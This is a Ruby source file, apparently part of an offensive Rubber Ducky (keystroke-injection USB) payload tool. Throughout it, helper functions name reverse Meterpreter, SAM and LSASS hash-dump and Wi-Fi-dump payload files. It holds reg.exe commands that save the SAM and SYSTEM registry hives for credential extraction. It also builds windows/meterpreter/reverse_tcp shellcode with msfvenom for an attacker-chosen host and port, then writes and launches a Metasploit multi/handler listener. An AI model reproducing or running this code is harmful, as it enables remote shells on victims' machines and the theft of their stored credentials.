#!/usr/bin/env ruby
require 'base64'
require 'fileutils'
module MainCommands
  def print_error(text)
    print "\e[31;1m[-]\e[0m #{text}"
  end
  def print_info(text)
    print "\e[34;1m[*]\e[0m #{text}"
  end
  def print_success(text)
    print "\e[32;1m[+]\e[0m #{text}"
  end
  def get_input(text)
    print "\e[33;1m[!]\e[0m #{text}"
  end
  def file_root
    File.expand_path(File.dirname($0))
  end
  def text_path
    Dir.mkdir(file_root + '/text_files/') if not Dir.exists?(file_root + '/text_files/')
    file_root + '/text_files/'
  end
  def duck_encode_file
    file_root + '/duck_encoder/'
  end
  def language_dir
    duck_encode_file + '/resources/'
  end
  def reverse_meterpreter_file
    'powershell_reverse_ducky.txt'
  end
  def hash_dump_file
    'hashdump_tcp.txt'
  end
  def lsass_dump_file
    'lsassdump_tcp.txt'
  end
  def wifi_dump_file
    'wifidump_tcp.txt'
  end
  def wget_file
    'wget_powershell.txt'
  end
  def hex_to_bin_file
    'hex_to_bin.txt'
  end
  def save_sam
    'reg.exe save HKLM\SAM c:\windows\temp\sam'
  end
  def save_sys
    'reg.exe save HKLM\SYSTEM c:\windows\temp\sys'
  end
  def victim_path
    'c:\\windows\\temp\\'
  end
  def temp_path
    'c:\\windows\\temp\\test.txt'
  end
  def encode_command(command)
    Base64.encode64(command.encode('utf-16le')).delete("\r\n")
  end
  def random_name_gen
    random_length = rand(4..8)
    file_name = random_length.to_i.times.map {[*'a'..'z',*'A'..'Z',*'0'..'9'].sample}.join
    return file_name
  end
  def hex_to_bin(file_name,hex_string)
    File.open(file_name,'w') {|f| f.write(hex_string.scan(/../).map { |x| x.hex }.pack('c*'))}
  end
  def bin_to_hex(file)
    bin_file = File.open(file, 'rb').read
    bin_file.unpack('H*').first
  end
end
module MsfCommands
  def generate_shellcode(host,port)
    if File.exist?('/usr/bin/msfvenom')
      @msf_path = '/usr/bin/'
    elsif File.exist?('/opt/metasploit-framework/msfvenom')
      @msf_path = ('/opt/metasploit-framework/')
    else
      print_error('Metasploit Not Found!')
      exit
    end
    @set_payload = 'windows/meterpreter/reverse_tcp'
    print_info("Generating shellcode\n")
    execute  = `#{@msf_path}./msfvenom --payload #{@set_payload} LHOST=#{host} LPORT=#{port} C`
    print_success("Shellcode Generated\n")
    shellcode = clean_shellcode(execute)
    return shellcode
  end
  def clean_shellcode(shellcode)
    shellcode = shellcode.gsub('\\', ',0')
    shellcode = shellcode.delete('+')
    shellcode = shellcode.delete('"')
    shellcode = shellcode.delete("\n")
    shellcode = shellcode.delete("\s")
    shellcode[0..4] = ''
    return shellcode
  end
  def metasploit_setup(host,port)
    Dir.mkdir(file_root + '/metaspoit_files/') if not Dir.exists?(file_root + '/metaspoit_files/')
    file_path = file_root + '/metaspoit_files/'
    rc_file = 'msf_listener.rc'
    print_info("Setting up Metasploit this may take a moment\n")
    file = File.open("#{file_path}#{rc_file}",'w')
    file.write("use exploit/multi/handler\n")
    file.write("set PAYLOAD #{@set_payload}\n")
    file.write("set LHOST #{host}\n")
    file.write("set LPORT #{port}\n")
    file.write("set EnableStageEncoding true\n")
    file.write("set ExitOnSession false\n")
    file.write('exploit -j')
    file.close
    system("#{@msf_path}./msfconsole -r #{file_path}#{rc_file}")
  end
end
